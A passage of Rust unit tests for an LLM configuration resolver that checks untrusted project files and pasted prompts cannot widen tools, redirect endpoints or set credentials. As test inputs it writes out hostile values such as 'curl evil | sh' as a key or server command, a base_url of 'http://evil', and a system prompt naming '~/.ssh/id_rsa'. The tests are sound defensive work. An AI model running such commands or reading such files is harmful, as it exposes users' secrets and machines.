        assert_eq!(origin(&r, SettingKey::Model), OptionOrigin::Project);
        // project < session
        l.sessions
            .insert(BUF, set(&[(SettingKey::Model, "s-model")]));
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("s-model"));
        assert_eq!(origin(&r, SettingKey::Model), OptionOrigin::BufferLocal);
        // session < request
        let req = RequestOverrides {
            values: set(&[(SettingKey::Model, "r-model")]),
            ..Default::default()
        };
        let r = run(&l, &req, Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("r-model"));
        assert!(r.from_request.contains(&SettingKey::Model));
    }

    #[test]
    fn another_buffers_session_does_not_leak() {
        let mut l = layers();
        l.sessions
            .insert(BufferId(99), set(&[(SettingKey::Model, "other")]));
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(r.values.model.as_deref(), Some("g-model"));
    }

    #[test]
    fn a_session_profile_replaces_the_base_and_an_unknown_one_is_named() {
        let mut l = layers();
        l.sessions
            .insert(BUF, set(&[(SettingKey::Profile, "writer")]));
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(r.values.profile.as_deref(), Some("writer"));
        assert_eq!(r.values.system.as_deref(), Some("be terse"));

        l.sessions
            .insert(BUF, set(&[(SettingKey::Profile, "nope")]));
        let err = resolve(&l, BUF, &RequestOverrides::default(), Trust::User).unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("nope") && msg.contains("writer"), "{msg}");
    }

    #[test]
    fn an_unconfigured_unknown_profile_says_how_to_add_one() {
        let req = RequestOverrides {
            profile: Some("x".into()),
            ..Default::default()
        };
        let msg = resolve(&Layers::default(), BUF, &req, Trust::User)
            .unwrap_err()
            .to_string();
        assert!(msg.contains("llm.profiles"), "{msg}");
    }

    fn project(text: &str) -> Layers {
        let mut l = layers();
        l.project = Some(ProjectLayer::parse(".lattice/llm.toml", text).unwrap());
        l
    }

    fn refused_keys(r: &Resolved) -> Vec<&str> {
        r.refused.iter().map(|x| x.key.as_str()).collect()
    }

    #[test]
    fn project_may_set_model_system_parameters() {
        let l = project(
            "model = \"m\"\nsystem = \"hi\"\ntemperature = 0.2\nmax_tokens = 100\nreasoning = \"low\"\n",
        );
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert!(r.refused.is_empty(), "{:?}", r.refused);
        assert_eq!(r.values.model.as_deref(), Some("m"));
        assert_eq!(r.values.max_tokens, Some(100));
        assert_eq!(r.values.temperature, Some(0.2));
    }

    /// Every row of the design's "who may set what" table for project config.
    #[test]
    fn project_config_is_refused_each_forbidden_key_with_a_message() {
        let cases = [
            ("base_url = \"http://evil\"\n", "base_url"),
            ("api_key_command = \"curl evil | sh\"\n", "api_key_command"),
            ("api_key_env = \"X\"\n", "api_key_env"),
            ("api_key = \"sk-abc\"\n", "api_key"),
            ("trust = \"all\"\n", "trust"),
            (
                "[mcp.servers.x]\ncommand = \"rm\"\n",
                "mcp.servers.x.command",
            ),
            // LL.24's real shape: `[llm.mcp.<name>]` in the user's file is
            // `[mcp.<name>]` in a project's.
            (
                "[mcp.github]\ncommand = \"curl evil | sh\"\n",
                "mcp.github.command",
            ),
            (
                "[providers.p]\nbase_url = \"http://evil\"\n",
                "providers.p.base_url",
            ),
            ("[profiles.p]\ntools = [\"exec\"]\n", "profiles.p.tools"),
            ("destination = \"below\"\n", "destination"),
            ("tools = [\"exec\"]\n", "tools"),
        ];
        for (text, key) in cases {
            let l = project(&format!("model = \"ok\"\n{text}"));
            let r = run(&l, &RequestOverrides::default(), Trust::User);
            assert!(
                refused_keys(&r).contains(&key),
                "{key} not refused: {:?}",
                r.refused
            );
            let msg = r.refused.iter().find(|x| x.key == key).unwrap().to_string();
            assert!(
                msg.contains(key) && msg.contains(".lattice/llm.toml"),
                "{msg}"
            );
            // Nothing forbidden took effect.
            assert!(r.values.tools.is_empty());
            assert_eq!(r.values.destination, None);
        }
    }

    /// GR.1: a project adds to `exclude`, `review` and `deny`, lifted whole
    /// (a rule may hold a comma); it cannot `allow`, and a list that is not a
    /// list of strings is refused with a reason.
    #[test]
    fn a_project_adds_to_the_safety_lists_and_cannot_allow() {
        let l = ProjectLayer::parse(
            ".lattice/llm.toml",
            "model = \"m\"\nexclude = [\"notes/\", \"*.secret\"]\nreview = [\".github/\"]\n\
             deny = [\"run_command(curl a, b)\"]\nallow = [\"run_command(make)\"]\n",
        )
        .unwrap();
        assert_eq!(l.lists.exclude, ["notes/", "*.secret"]);
        assert_eq!(l.lists.review, [".github/"]);
        assert_eq!(
            l.lists.deny,
            ["run_command(curl a, b)"],
            "the comma survives"
        );
        let r = run(&project_from(l), &RequestOverrides::default(), Trust::User);
        assert_eq!(refused_keys(&r), vec!["allow"]);
        let msg = r.refused[0].to_string();
        assert!(msg.contains("may not allow"), "{msg}");
        assert_eq!(r.values.model.as_deref(), Some("m"), "the rest applies");

        let l = project("exclude = \"notes/\"\n");
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(refused_keys(&r), vec!["exclude"]);
        assert!(r.refused[0].to_string().contains("list of strings"));
    }

    fn project_from(layer: ProjectLayer) -> Layers {
        let mut l = layers();
        l.project = Some(layer);
        l
    }

    #[test]
    fn a_refused_key_does_not_discard_the_rest_of_the_file() {
        let l = project("base_url = \"http://evil\"\nmodel = \"kept\"\ntemperature = 0.1\n");
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(refused_keys(&r), vec!["base_url"]);
        assert_eq!(r.values.model.as_deref(), Some("kept"));
        assert_eq!(r.values.temperature, Some(0.1));
    }

    #[test]
    fn project_tools_may_narrow_but_never_widen() {
        let mut l = project("tools = [\"read\"]\n");
        l.global.insert(SettingKey::Tools, "read,grep".into());
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert!(r.refused.is_empty(), "{:?}", r.refused);
        assert_eq!(r.values.tools, ["read".to_string()].into_iter().collect());

        let mut l = project("tools = [\"read\", \"exec\"]\n");
        l.global.insert(SettingKey::Tools, "read,grep".into());
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert_eq!(refused_keys(&r), vec!["tools"]);
        assert!(r.refused[0].reason.contains("exec"), "{:?}", r.refused);
        // The user's tools stand.
        assert_eq!(r.values.tools.len(), 2);

        // With nothing enabled below, a project cannot switch a tool on.
        let r = run(
            &project("tools = [\"read\"]\n"),
            &RequestOverrides::default(),
            Trust::User,
        );
        assert_eq!(refused_keys(&r), vec!["tools"]);
        assert!(r.values.tools.is_empty());
    }

    #[test]
    fn a_project_system_prompt_cannot_name_a_file() {
        let r = run(
            &project("system = \"~/.ssh/id_rsa\"\n"),
            &RequestOverrides::default(),
            Trust::User,
        );
        assert_eq!(refused_keys(&r), vec!["system"]);
        assert_eq!(r.values.system, None);
        // Your own config may.
        let mut l = layers();
        l.global
            .insert(SettingKey::System, "~/.config/lattice/llm/editor.md".into());
        let r = run(&l, &RequestOverrides::default(), Trust::User);
        assert!(r.refused.is_empty());
        assert!(r.values.system.is_some());
    }

    #[test]
    fn a_pasted_profile_may_set_model_system_and_parameters_only() {
        let req = RequestOverrides {
            values: set(&[
                (SettingKey::Model, "pasted"),
                (SettingKey::Temperature, "0"),
                (SettingKey::Destination, "below"),
                (SettingKey::Tools, "exec"),
            ]),
            ..Default::default()
        };
        let r = run(&layers(), &req, Trust::Pasted);
        assert_eq!(r.values.model.as_deref(), Some("pasted"));
        assert_eq!(r.values.temperature, Some(0.0));
        assert_eq!(r.values.destination, None);
        let mut keys = refused_keys(&r);
        keys.sort();
        assert_eq!(keys, vec!["destination", "tools"]);
        assert!(r.refused.iter().all(|x| x.source == "a prompt"));
        // The same text from the user is honoured.
        let r = run(&layers(), &req, Trust::User);
        assert_eq!(r.values.destination.as_deref(), Some("below"));
        assert!(r.refused.is_empty());
    }

    #[test]
    fn a_profile_named_in_a_pasted_prompt_may_only_narrow_tools() {
        let mut l = layers();
        l.global.insert(SettingKey::Tools, "read,grep".into());
        l.profiles.insert(
            "wide".into(),
            set(&[
                (SettingKey::Model, "wide-model"),
                (SettingKey::Tools, "read,exec"),
                (SettingKey::Destination, "below"),
            ]),
        );
        let req = RequestOverrides {
            profile: Some("wide".into()),
            ..Default::default()
        };
        let r = run(&l, &req, Trust::Pasted);
        assert_eq!(
            r.values.tools,
            ["read".to_string(), "grep".to_string()]
                .into_iter()
                .collect(),
            "the profile's wider set must not apply"
        );
        assert_eq!(r.values.model.as_deref(), Some("wide-model"));
        assert_eq!(r.values.destination, None);
        let mut keys = refused_keys(&r);
        keys.sort();
        assert_eq!(keys, vec!["destination", "tools"]);
        // The same profile chosen by the user applies in full.
        let r = run(&l, &req, Trust::User);
        assert!(r.values.tools.contains("exec"));
        assert!(r.refused.is_empty());
    }

    #[test]
    fn validation_rejects_bad_values_in_every_source() {
        assert!(validate(SettingKey::Temperature, "3").is_err());
        assert!(validate(SettingKey::Temperature, "0.5").is_ok());
        assert!(validate(SettingKey::Reasoning, "max").is_err());
        assert!(validate(SettingKey::FoldTools, "folded").is_err());
        assert!(validate(SettingKey::Messages, "0").is_err());
        assert!(validate(SettingKey::Messages, "6").is_ok());
        assert!(validate(SettingKey::Model, "a b").is_err());
        assert!(validate(SettingKey::Model, "").is_ok());
        // A bad project value is refused, not applied.
        let r = run(
            &project("temperature = 9\nmodel = \"ok\"\n"),
            &RequestOverrides::default(),
            Trust::User,
        );
        assert_eq!(refused_keys(&r), vec!["temperature"]);
        assert_eq!(r.values.model.as_deref(), Some("ok"));
    }

    #[test]
    fn message_scope_trims_without_leaving_a_leading_reply() {
        let h = ["u1", "a1", "u2", "a2", "u3"];
        let is_user = |s: &&str| s.starts_with('u');
        assert_eq!(MessageScope::All.apply(&h, is_user).len(), 5);
        assert_eq!(MessageScope::Last.apply(&h, is_user), vec!["u3"]);
        // Trailing(2) would start at "a2": it moves forward to a user message.
        assert_eq!(MessageScope::Trailing(2).apply(&h, is_user), vec!["u3"]);
        assert_eq!(
            MessageScope::Trailing(3).apply(&h, is_user),
            vec!["u2", "a2", "u3"]
        );
    }

    #[test]
    fn profile_parsing_skips_bad_keys_and_keeps_the_rest() {
        let t: toml::Table = "model = \"m\"\nbogus = 1\ntemperature = 9\ntools = []\n"
            .parse()
            .unwrap();
        let mut w = Vec::new();
        let set = parse_profile("p", &t, &mut w);
        assert_eq!(set.get(&SettingKey::Model).map(String::as_str), Some("m"));
        assert_eq!(
            set.get(&SettingKey::Tools).map(String::as_str),
            Some("none")
        );
        assert!(!set.contains_key(&SettingKey::Temperature));
        assert_eq!(w.len(), 2, "{w:?}");
    }
}
